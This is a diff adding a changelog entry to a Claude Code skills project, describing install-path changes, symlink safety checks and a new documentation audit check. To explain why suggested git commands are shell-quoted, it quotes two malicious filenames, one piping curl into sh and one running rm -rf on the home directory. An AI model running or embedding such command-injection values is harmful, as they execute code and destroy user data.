@@ -2,6 +2,175 @@
 
 All notable changes to this project will be documented in this file.
 
+## [0.18.14.0] - 2026-05-06
+
+### Track 5A — Install pipeline polish
+
+Closes the v0.16.0 known-limitation gap where `--skills-dir <custom>` shipped
+working symlink installs but skill preambles silently no-op'd helper
+resolution. The fix was NOT to extend the env-var/RC-file hack the original
+spec proposed, but to mirror gstack core's actual behavior: skill preambles
+probe `~/.claude/skills/{name}/SKILL.md` then `.claude/skills/{name}/SKILL.md`
+and stop. Anything beyond those two paths is unsupported.
+
+#### Breaking change: `--skills-dir` retired for install
+
+Running `./setup --skills-dir <path>` (without `--uninstall`) now exits 1 with
+a migration message. Skill preambles only discover symlinks at the two probed
+paths above, so symlinks at custom paths were never load-bearing — the v0.16.0
+flag shipped a misleading capability. The flag is preserved ONLY when paired
+with `--uninstall` as a one-way escape hatch for cleaning up v0.16.0-era
+custom installs:
+
+```sh
+./setup --skills-dir <old-custom-dir> --uninstall
+```
+
+If you never used `--skills-dir`, this changes nothing for you.
+
+#### Added: skill preamble path-2 fallthrough (vendored install support)
+
+All 5 skill preambles (`pair-review`, `roadmap`, `full-review`,
+`review-apparatus`, `test-plan`) now probe `~/.claude/skills/{name}/SKILL.md`
+first, falling back to `.claude/skills/{name}/SKILL.md` (project-local
+vendored install) on miss:
+
+```bash
+_SKILL_SRC=$(readlink ~/.claude/skills/{name}/SKILL.md 2>/dev/null \
+           || readlink .claude/skills/{name}/SKILL.md 2>/dev/null)
+```
+
+Vendored installs at `<project-root>/.claude/skills/{name}/SKILL.md` MUST be
+absolute symlinks for the `dirname dirname readlink` chain to resolve
+`$_EXTEND_ROOT` correctly. `setup`'s install loop already creates absolute
+symlinks (`SCRIPT_DIR` resolves via `pwd -P`). Manual relative-symlink drops
+will silently fail — same constraint gstack core has.
+
+`tests/skill-protocols.test.ts` now asserts the path-2 fallthrough line is
+present in all 5 skill preambles, locking against future drift.
+
+`skills/test-plan.md`'s Phase 8 inline-Read of `pair-review.md` was updated
+to use the same two-path probe so vendored installs work end-to-end.
+
+#### Added: install-time symlink hardening (defense in depth)
+
+Two layers of new safety checks in `setup`:
+
+1. **Install root** (`bin/lib/install-safety.sh:is_safe_install_path`) —
+   resolves `$SKILLS_DIR` (or its nearest existing ancestor) and refuses
+   install if the resolved target is foreign-owned (numeric uid mismatch),
+   world-writable (`find -perm -o+w`), or outside the resolved `$HOME`
+   (slash-delimited case match). Permits legitimate dotfiles/sync setups
+   (Dropbox, chezmoi, GNU stow) where the user owns the resolved target.
+
+2. **Per-target** (`bin/lib/install-safety.sh:is_safe_target_path`) —
+   refuses install when `$SKILLS_DIR/{name}` is a symlink, regular file,
+   FIFO, or any non-directory entry. Same check applies in the uninstall
+   iteration for both `SKILLS` and `LEGACY_SKILLS=(browse-native)` paths.
+
+Preflight: ALL targets are validated before ANY mutation. A failed safety
+check on skill 3 cannot leave skills 1 and 2 in a partial-install state.
+
+Cross-platform: numeric uid via `stat -f '%u'` (BSD) / `stat -c '%u'` (GNU);
+ancestor walk handles non-existent install dirs that `setup` will create;
+`cd -P && pwd -P` resolves symlinks portably.
+
+#### Added: `DOC_TYPE_MISMATCH` audit check
+
+New `src/audit/checks/doc-type.ts` emits warnings when a markdown file's
+content disagrees with its location:
+
+- **Design doc outside `docs/designs/`** — fenced code block with `mermaid`
+  or `plantuml` language identifier.
+- **Inbox doc outside `TODOS.md`** — checkbox density >= 0.50 (lines matching
+  `^\s*[-*]\s*\[[ x]\]` divided by non-blank, non-heading content lines).
+  Files with fewer than 5 content lines are skipped.
+
+Each finding includes a copy-pasteable suggestion: `git mv -- <quoted-src>
+<quoted-dst>` when destination is unambiguous, `mkdir -p <quoted-parent>
+&& git mv -- ...` when parent dir doesn't exist yet, or `review and move
+(no automated suggestion — destination ambiguous)` when the destination
+collides.
+
+Suggested commands single-quote every path via a POSIX-compliant
+`shellQuote` helper and use the `--` end-of-options sentinel. Defends
+against malicious filenames like `a;curl evil|sh.md` or `$(rm -rf $HOME)`
+that would otherwise execute when a user copy-pastes the suggestion.
+Codex ship review caught this as P0.
+
+Inbox-mismatch destination resolution honors whichever location of
+`TODOS.md` actually exists (root vs `docs/`) per the existing
+`check_doc_location` `PROJECT_DOC_PAIRS` rule. If neither exists, defaults
+to `docs/TODOS.md` (canonical). Avoids the bug where suggestions would
+always emit `git mv X TODOS.md` at the repo root, creating a shadow file
+that masks `docs/TODOS.md`.
+
+Filename allowlist exempts known-checklist docs that legitimately have
+checkbox density: `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `RUNBOOK.md`,
+`SECURITY.md`, `SUPPORT.md`, `GOVERNANCE.md`, `*checklist*`. Existing
+`ROOT_DOCS` and `DOCS_DIR_DOCS` (handled by `DOC_LOCATION`) are also skipped.
+
+Inherits the existing `walkMdFiles` maxdepth-2 walk scope; deeper docs
+(`docs/guides/foo.md`) are not scanned.
+
+`DOC_TYPE_MISMATCH` is registered as a CANONICAL audit section adjacent to
+`DOC_LOCATION` in `src/audit/sections.ts` — every `bin/roadmap-audit` run
+emits the section (status `pass` with `(none)` when no mismatches found,
+`warn` with findings + git-mv suggestions when content disagrees with
+location). The 23 existing snapshot fixtures regenerated mechanically via
+`UPDATE_SNAPSHOTS=1`. New fixture `tests/roadmap-audit/doc-type-mismatch/`
+exercises both heuristics (mermaid fence + checkbox density) end-to-end.
+
+#### Itemized changes
+
+- New `bin/lib/install-safety.sh` — `is_safe_install_path` (resolved-path
+  + ownership + world-writable + inside-$HOME) and `is_safe_target_path`
+  (symlink + non-directory refusal).
+- New `src/audit/checks/doc-type.ts` — DOC_TYPE_MISMATCH heuristic with
+  filename allowlist + git-mv preview suggestions.
+- New fixture `tests/roadmap-audit/doc-type-mismatch/` — positive case for
+  both heuristics.
+- New tests `tests/lib-install-safety.test.ts` — 15 unit tests for both
+  helper functions via shell-out.
+- `setup` — sources `bin/lib/install-safety.sh`; preflight-then-mutate
+  install loop; `--skills-dir` rejection for install path; `USAGE` text
+  refresh; uninstall path emits visible `Skipped <skill>` for symlinked
+  or non-directory targets.
+- `skills/{full-review,pair-review,review-apparatus,roadmap,test-plan}.md`
+  — preamble probe gains path-2 fallthrough.
+- `skills/test-plan.md` — Phase 8 inline-Read uses the same two-path probe.
+- `src/audit/sections.ts` — `DOC_TYPE_MISMATCH` appended to
+  `CANONICAL_SECTIONS` adjacent to `DOC_LOCATION`.
+- `src/audit/cli.ts` — registers `runCheckDocType` in `ALL_CHECKS` adjacent
+  to `runCheckDocLocation`.
+- `tests/update.test.ts` — drops `--skills-dir` install cluster; adds
+  `--skills-dir` install rejection test; adds D6 expanded coverage
+  (world-writable, outside-$HOME, per-target symlink, regular file at
+  target); adds CP#3 integration tests (default install + vendored
+  fallthrough + truly-broken silent no-op); legacy `--skills-dir +
+  --uninstall` cluster reseeded via `mkdirSync` + `symlinkSync` (no
+  longer depends on the retired install path).
+- `tests/skill-protocols.test.ts` — new `Track 5A two-path preamble probe`
+  describe block asserting all 5 skills carry the path-2 fallthrough line.
+- `tests/roadmap-audit/*/expected.txt` (23 fixtures) — regenerated to
+  include the new `## DOC_TYPE_MISMATCH` section (status `pass` for all
+  existing fixtures since none trip the heuristic).
+- `README.md` — removes the v0.16.0 "Per-project installs (`--skills-dir`)"
+  section + the known-limitation note pointing at this Track.
+
+#### Migration
+
+Anyone with v0.16.0-era custom installs at `<custom-path>/{skill}/SKILL.md`
+should run:
+
+```sh
+./setup --skills-dir <custom-path> --uninstall
+./setup
+```
+
+The first command cleans up orphan symlinks at the custom path; the second
+installs to `~/.claude/skills/` where preambles will actually find them.
+
 ## [0.18.13.0] - 2026-05-05
 
 ### Added (auto-release on VERSION change)
